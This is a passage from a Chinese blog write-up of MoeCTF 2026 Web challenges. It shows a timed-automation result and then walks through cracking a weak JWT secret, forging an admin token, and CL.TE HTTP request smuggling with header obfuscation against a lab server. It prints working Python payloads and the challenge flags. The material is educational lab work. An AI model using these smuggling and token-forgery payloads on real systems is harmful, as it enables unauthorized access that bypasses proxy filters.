+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stage1: &#123;&quot;ok&quot;: true, &quot;message&quot;: &quot;人工组完成装配，机械组仍在倒计时。&quot;&#125;</span><br><span class="line">stage2: &#123;&quot;ok&quot;: true, &quot;message&quot;: &quot;人工组调试成功，可以进入最终验收。&quot;&#125;</span><br><span class="line">stamped machine count: 48</span><br><span class="line">sha256: 618530464a2740799e11388655c1589ee51dcae31d489181d9d90cb108002b9b</span><br><span class="line">finalize: &#123;&quot;ok&quot;: true, &quot;flag&quot;: &quot;moectf&#123;Comput3rs_@r3_m@gn!fic3nt_+00l&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/wafm_3_flag.png" alt="提交得到 flag"></p>
+<p><strong>Flag:</strong> <code>moectf{Comput3rs_@r3_m@gn!fic3nt_+00l}</code></p>
+<p>小结：前两关是固定答案的过场题，真正考点在第三关的 <strong>20 秒竞速窗口</strong>。这类「时间窗口 &#x2F; 限时任务」的设计意图是考察自动化能力（288 份档案 20 秒读完必须高并发）和会话有效期意识（cookie 会过期、<code>finalize</code> 也要带未过期的 cookie）。「竞速」题的思路统一是：先把能确定的规则摸清（机械组 <code>id % 3 == 0</code>、通过 <code>id % 6 == 0</code>），再用脚本在窗口内一次性自动化完成，而不是靠手速。</p>
+<hr>
+<h2 id="6-黑市走私（250-分）"><a href="#6-黑市走私（250-分）" class="headerlink" title="6. 黑市走私（250 分）"></a>6. 黑市走私（250 分）</h2><blockquote>
+<p>MoeCTF 2026 · Web · 250 分</p>
+</blockquote>
+<p>「BLACK FLAG MARKET」黑市，flag 是禁售品，直接买会被「巡逻队」逮捕。页面给出四条路：</p>
+<ul>
+<li><code>/stage1</code> 黑商1 → 目标货物 <code>/flag1</code></li>
+<li><code>/stage2</code> 黑商2 → 目标货物 <code>/flag2</code></li>
+<li><code>/flag1</code>、<code>/flag2</code> → 直接访问返回 403「禁售品巡逻队已抵达，你已因尝试获取 flag 被逮捕」</li>
+</ul>
+<p><code>/hint</code> 引路人给出一个 JWT，并提示密钥是常见词、要把 <code>role</code> 改成 <code>admin</code>、<code>scope</code> 改成 <code>flags</code>。</p>
+<h3 id="第一步：伪造-JWT"><a href="#第一步：伪造-JWT" class="headerlink" title="第一步：伪造 JWT"></a>第一步：伪造 JWT</h3><p>先认识 <strong>JWT（JSON Web Token）</strong>——一种紧凑、自包含的令牌格式，常用于身份认证，由三段用 <code>.</code> 连接、各自 base64 编码：<code>header.payload.signature</code>。header 描述算法（如 <code>{&quot;alg&quot;:&quot;HS256&quot;}</code>），payload 存放声明（如 <code>{&quot;role&quot;:&quot;admin&quot;}</code>），signature 是签名、防止内容被篡改。注意 <strong>JWT 本身不加密</strong>，payload 只是 base64 编码，任何人解码就能看到内容；它的安全性依赖签名验证。</p>
+<p><code>/hint</code> 里的普通入场券：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br><span class="line">payload: eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJndWVzdCIsInNjb3BlIjoicmVhZCJ9</span><br></pre></td></tr></table></figure>
+
+<p>payload 解出来是 <code>{&quot;sub&quot;:&quot;traveler&quot;,&quot;role&quot;:&quot;guest&quot;,&quot;scope&quot;:&quot;read&quot;}</code>。</p>
+<p>JWT 的 <code>HS256</code> 算法就是 <strong>HMAC-SHA256</strong>：HMAC 是「带密钥的哈希」<code>HMAC(key, message)</code>，用密钥把消息哈希一遍，能同时提供完整性和认证（只有持密钥者才能算出正确签名）；HMAC-SHA256 就是用 SHA-256 做底层哈希。签名 &#x3D; <code>HMAC-SHA256(密钥, header.payload)</code>。如果<strong>密钥太弱</strong>，攻击者就能拿候选词逐个算签名、和已知签名比对，命中即拿到密钥，之后任意伪造 token。</p>
+<p>密钥候选：<code>MoeCTF / xdu / xidian / xdsec / L / welcome / happy / fish</code>，逐个比对，命中 <strong><code>fish</code></strong>。伪造高级买家票据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">t = jwt.encode(&#123;<span class="string">&#x27;sub&#x27;</span>:<span class="string">&#x27;traveler&#x27;</span>,<span class="string">&#x27;role&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;scope&#x27;</span>:<span class="string">&#x27;flags&#x27;</span>&#125;, <span class="string">&#x27;fish&#x27;</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI</span><br></pre></td></tr></table></figure>
+
+<p>但带着它直接访问 <code>/flag1</code> 还是 403——因为前端代理把路径里的 <code>flag</code> 关键词拦了，必须用 <strong>HTTP 请求走私</strong> 把请求藏进 body 里绕过前端。</p>
+<h3 id="第二步：CL-TE-走私拿-flag1"><a href="#第二步：CL-TE-走私拿-flag1" class="headerlink" title="第二步：CL.TE 走私拿 &#x2F;flag1"></a>第二步：CL.TE 走私拿 &#x2F;flag1</h3><p>请求走私发生在「多级 HTTP 架构」里：请求先经过一个<strong>前端代理&#x2F;负载均衡</strong>，再由它转发给<strong>后端服务器</strong>。根源是 HTTP 请求的「结束边界」有<strong>两种互相冲突的表示方式</strong>：</p>
+<ul>
+<li><strong>Content-Length（CL）</strong>：直接用数字标明 body 字节长度；</li>
+<li><strong>Transfer-Encoding: chunked（TE）</strong>：body 切成若干「分块」，每块前标一个十六进制块长度，最后以 <code>0\r\n\r\n</code> 结束，适合长度未知的流式传输。</li>
+</ul>
+<p>当请求<strong>同时带这两个头</strong>时，不同实现会「优先相信谁」产生分歧——这就是走私的根源。如果前后端对边界理解不一致，后端可能把「一个请求」误判成「两个」：攻击者把第二个请求藏在第一个请求的 body 里，前端按 A 方式把整段转发、后端按 B 方式解析，就会把 body 里藏着的「走私请求」当成新的独立请求执行，从而绕过前端过滤。</p>
+<p>黑商1 的暗号「先让柜台只看货箱长度，再让后仓按分块清点」→ 前端（柜台）用 CL、后端（后仓）用 TE，即 <strong>CL.TE</strong>（<code>前.后</code> 表示各自采用的解析方式）。</p>
+<p>构造：一个 <code>POST /stage1</code>，同时带 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code>，body 里先写 <code>0\r\n\r\n</code>（chunked 结束），再塞进一段完整的 <code>GET /flag1</code> 请求。前端按 CL 把整段 body 原样转发；后端按 TE 解析，<code>0</code> 之后的内容被当成新的一个请求，直接处理 <code>GET /flag1</code> 并带上高级票据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">smuggled = (</span><br><span class="line">    <span class="string">f&quot;GET /flag1 HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Host: 127.0.0.1:8080\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Authorization: Bearer <span class="subst">&#123;jwt&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Connection: close\r\n\r\n&quot;</span></span><br><span class="line">)</span><br><span class="line">body = <span class="string">&quot;0\r\n\r\n&quot;</span> + smuggled</span><br><span class="line">req = (</span><br><span class="line">    <span class="string">f&quot;POST /stage1 HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Host: 127.0.0.1:8080\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body.encode())&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Transfer-Encoding: chunked\r\n\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>响应里走私出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1: moectf&#123;Y0u_have_m4r</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三步：TE-头混淆走私拿-flag2"><a href="#第三步：TE-头混淆走私拿-flag2" class="headerlink" title="第三步：TE 头混淆走私拿 &#x2F;flag2"></a>第三步：TE 头混淆走私拿 &#x2F;flag2</h3><p>黑商2 的暗号「冒号前多了一粒灰」「Transfer-Encoding 后的空隙」→ 在冒号前加一个空格，把请求头写成 <code>Transfer-Encoding : chunked</code>（<code>:</code> 前有空格）。这是<strong>请求头混淆（Header Obfuscation）</strong>：HTTP 规范对头格式的宽容度，让前后端解析器常有差异——前端读到带空格的伪头，认不出这是 TE、退回用 CL；后端容忍空格、照常按 TE chunked 解析。本质还是 CL.TE，只是靠混淆让前端「看不见」TE。</p>
+<p>同样的 payload，把目标换成 <code>/flag2</code>，并把 TE 头改成 <code>Transfer-Encoding : chunked</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">req = (</span><br><span class="line">    <span class="string">f&quot;POST /stage2 HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Host: 127.0.0.1:8080\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body.encode())&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;Transfer-Encoding : chunked\r\n\r\n&quot;</span>   <span class="comment"># 冒号前空格</span></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>响应里走私出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2: 3d_http_5mu6g1!n6&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>两半拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_have_m4r3d_http_5mu6g1!n6&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（读作 <em>You have mastered http smuggling!</em>）</p>
+<p><strong>Flag:</strong> <code>moectf{Y0u_have_m4r3d_http_5mu6g1!n6}</code></p>
+<p>小结：JWT 密钥 <code>fish</code> 可从提示候选词逐个比对签名得出，伪造 <code>role=admin, scope=flags</code>；前端代理拦 <code>flag</code> 关键词 → 用 HTTP 请求走私绕过；<code>/flag1</code> 用标准 <strong>CL.TE</strong>、<code>/flag2</code> 用 <strong>TE 头混淆</strong>（<code>Transfer-Encoding : chunked</code> 冒号前加空格）。走私的关键始终是：前后端对请求体边界理解不一致，导致后端把 body 里藏着的请求当成新的独立请求执行。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://iss-xx.xin">iss</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://iss-xx.xin/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/">http://iss-xx.xin/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/MoeCTF/">MoeCTF</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a><a class="post-meta__tags" href="/tags/LFI/">LFI</a><a class="post-meta__tags" href="/tags/SQL%E7%9B%B2%E6%B3%A8/">SQL盲注</a><a class="post-meta__tags" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP请求走私</a><a class="post-meta__tags" href="/tags/JWT/">JWT</a><a class="post-meta__tags" href="/tags/Cookie/">Cookie</a></div><div class="post-share"><div class="social-share" data-image="/img/x6.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/09/01/MoeCTF-2026-Web-%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Writeup/" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（上）"><img class="cover" src="/img/x5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">MoeCTF 2026 Web 安全与渗透测试 Writeup（上）</div></div><div class="info-2"><div class="info-item-1">  MoeCTF 2026 Web 安全与渗透测试 Writeup（上篇） 西电 CTF 终端 · MoeCTF 2026 新生赛 · Web 安全与渗透测试方向 · 上篇（共 7 题）   1. 查分系统（20 分） MoeCTF 2026 · Web 安全与渗透测试附件：system(2).html（静态网页）  打开附件，是一个「数学分析期末成绩查询」网页，只有一个学号输入框和查询按钮。网页是纯静态的——没有后端，所有逻辑和数据都跟着页面一起下发给浏览器。  在 &lt;script&gt; 里找到核心逻辑 searchScore()，全体学生成绩存在一个 allStudentData 数组里，查询时用 find() 按学号匹配后原样展示所有字段： 1234567891011121314151617181920212223242526272829303132const studentIdKey = `学号`;function searchScore() &#123;    const inputDom = document.getElementById(&quot;inpu...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/09/01/MoeCTF-2026-Web-%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Writeup/" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（上）"><img class="cover" src="/img/x5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-09-01</div><div class="info-item-2">MoeCTF 2026 Web 安全与渗透测试 Writeup（上）</div></div><div class="info-2"><div class="info-item-1">  MoeCTF 2026 Web 安全与渗透测试 Writeup（上篇） 西电 CTF 终端 · MoeCTF 2026 新生赛 · Web 安全与渗透测试方向 · 上篇（共 7 题）   1. 查分系统（20 分） MoeCTF 2026 · Web 安全与渗透测试附件：system(2).html（静态网页）  打开附件，是一个「数学分析期末成绩查询」网页，只有一个学号输入框和查询按钮。网页是纯静态的——没有后端，所有逻辑和数据都跟着页面一起下发给浏览器。  在 &lt;script&gt; 里找到核心逻辑 searchScore()，全体学生成绩存在一个 allStudentData 数组里，查询时用 find() 按学号匹配后原样展示所有字段： 1234567891011121314151617181920212223242526272829303132const studentIdKey = `学号`;function searchScore() &#123;    const inputDom = document.getElementById(&quot;inpu...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">iss</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/iss-xx/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/iss-xx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://qq.com/24892186532@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MoeCTF-2026-Web-%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Writeup%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">MoeCTF 2026 Web 安全与渗透测试 Writeup（下篇）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%86%8A%E5%87%BA%E6%B2%A1%EF%BC%88100-%E5%88%86%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">1. 熊出没（100 分）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%90%88%E4%B9%8E%E5%91%A8%E7%A4%BC%EF%BC%88150-%E5%88%86%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">2. 合乎周礼（150 分）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%83%E7%8B%97%E5%85%8D%E8%B4%B9%E5%B0%8F%E8%AF%B4%EF%BC%88150-%E5%88%86%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">3. 七狗免费小说（150 分）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%B1%9F%E6%B4%8B%E5%A4%A7%E7%9B%97%EF%BC%88200-%E5%88%86%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">4. 江洋大盗（200 分）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%88%91%E7%88%B1%E5%8F%91%E6%98%8E%EF%BC%88200-%E5%88%86%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">5. 我爱发明（200 分）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E9%BB%91%E5%B8%82%E8%B5%B0%E7%A7%81%EF%BC%88250-%E5%88%86%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">6. 黑市走私（250 分）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BC%AA%E9%80%A0-JWT"><span class="toc-number">1.6.1.</span> <span class="toc-text">第一步：伪造 JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9ACL-TE-%E8%B5%B0%E7%A7%81%E6%8B%BF-flag1"><span class="toc-number">1.6.2.</span> <span class="toc-text">第二步：CL.TE 走私拿 &#x2F;flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9ATE-%E5%A4%B4%E6%B7%B7%E6%B7%86%E8%B5%B0%E7%A7%81%E6%8B%BF-flag2"><span class="toc-number">1.6.3.</span> <span class="toc-text">第三步：TE 头混淆走私拿 &#x2F;flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">1.6.4.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（下）"><img src="/img/x6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2026 Web 安全与渗透测试 Writeup（下）"/></a><div class="content"><a class="title" href="/2026/09/13/MoeCTF%202026%20Web%20%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%20Writeup%EF%BC%88%E4%B8%8B%EF%BC%89/" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（下）">MoeCTF 2026 Web 安全与渗透测试 Writeup（下）</a><time datetime="2026-09-13T12:30:00.000Z" title="Created 2026-09-13 20:30:00">2026-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/01/MoeCTF-2026-Web-%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Writeup/" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（上）"><img src="/img/x5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2026 Web 安全与渗透测试 Writeup（上）"/></a><div class="content"><a class="title" href="/2026/09/01/MoeCTF-2026-Web-%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Writeup/" title="MoeCTF 2026 Web 安全与渗透测试 Writeup（上）">MoeCTF 2026 Web 安全与渗透测试 Writeup（上）</a><time datetime="2026-09-01T15:00:23.000Z" title="Created 2026-09-01 23:00:23">2026-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/30/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/" title="备份文件信息泄露"><img src="/img/x1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="备份文件信息泄露"/></a><div class="content"><a class="title" href="/2026/08/30/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/" title="备份文件信息泄露">备份文件信息泄露</a><time datetime="2026-08-30T15:00:46.000Z" title="Created 2026-08-30 23:00:46">2026-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/08/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94pop%E9%93%BE%E6%9E%84%E9%80%A0/" title="序列化与反序列化———pop链构造"><img src="/img/x2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="序列化与反序列化———pop链构造"/></a><div class="content"><a class="title" href="/2026/08/08/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94pop%E9%93%BE%E6%9E%84%E9%80%A0/" title="序列化与反序列化———pop链构造">序列化与反序列化———pop链构造</a><time datetime="2026-08-08T15:45:25.000Z" title="Created 2026-08-08 23:45:25">2026-08-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/01/Python%E8%AF%AD%E6%B3%95/" title="从C/C++到Python"><img src="/img/x4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从C/C++到Python"/></a><div class="content"><a class="title" href="/2026/08/01/Python%E8%AF%AD%E6%B3%95/" title="从C/C++到Python">从C/C++到Python</a><time datetime="2026-08-01T15:30:23.000Z" title="Created 2026-08-01 23:30:23">2026-08-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By iss</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.6.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.6.1"></script><script src="/js/main.js?v=5.6.1"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
